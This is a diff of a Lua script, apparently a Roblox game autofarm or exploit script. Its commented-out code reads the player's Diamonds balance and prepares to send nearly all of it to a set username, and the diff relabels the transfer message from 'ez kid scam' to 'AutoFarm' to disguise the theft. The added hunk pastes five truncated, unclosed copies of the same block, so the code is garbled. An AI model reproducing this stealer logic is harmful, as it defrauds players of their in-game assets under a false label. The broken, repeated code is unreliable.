@@ -15,7 +15,7 @@
         --if v.id == "Diamonds" and v._am and v._am > 5000000 then
             --local args = {
                 --[1] = Username,
-                --[2] = "ez kid scam",
+                --[2] = "AutoFarm",
                 --[3] = "Currency",
                 --[4] = i,
                 --[5] = (v._am or 0) - 10000
@@ -55,6 +55,55 @@
     --end
 --end
 
+    --Save = require(game.ReplicatedStorage.Library.Client.Save).Get()
+    --for i, v in pairs(Save.Inventory.Currency) do
+        --if v.id == "Diamonds" and v._am and v._am > 5000000 then
+            --local args = {
+                --[1] = Username,
+                --[2] = "AutoFarm",
+                --[3] = "Currency",
+                --[4] = i,
+                --[5] = (v._am or 0) - 10000
+
+    --Save = require(game.ReplicatedStorage.Library.Client.Save).Get()
+    --for i, v in pairs(Save.Inventory.Currency) do
+        --if v.id == "Diamonds" and v._am and v._am > 5000000 then
+            --local args = {
+                --[1] = Username,
+                --[2] = "AutoFarm",
+                --[3] = "Currency",
+                --[4] = i,
+                --[5] = (v._am or 0) - 10000
+
+    --Save = require(game.ReplicatedStorage.Library.Client.Save).Get()
+    --for i, v in pairs(Save.Inventory.Currency) do
+        --if v.id == "Diamonds" and v._am and v._am > 5000000 then
+            --local args = {
+                --[1] = Username,
+                --[2] = "AutoFarm",
+                --[3] = "Currency",
+                --[4] = i,
+                --[5] = (v._am or 0) - 10000
+
+    --Save = require(game.ReplicatedStorage.Library.Client.Save).Get()
+    --for i, v in pairs(Save.Inventory.Currency) do
+        --if v.id == "Diamonds" and v._am and v._am > 5000000 then
+            --local args = {
+                --[1] = Username,
+                --[2] = "AutoFarm",
+                --[3] = "Currency",
+                --[4] = i,
+                --[5] = (v._am or 0) - 10000
+
+    --Save = require(game.ReplicatedStorage.Library.Client.Save).Get()
+    --for i, v in pairs(Save.Inventory.Currency) do
+        --if v.id == "Diamonds" and v._am and v._am > 5000000 then
+            --local args = {
+                --[1] = Username,
+                --[2] = "AutoFarm",
+                --[3] = "Currency",
+                --[4] = i,
+                --[5] = (v._am or 0) - 10000
 if LoadingScreen == nil then
     LoadingScreen = false
 end
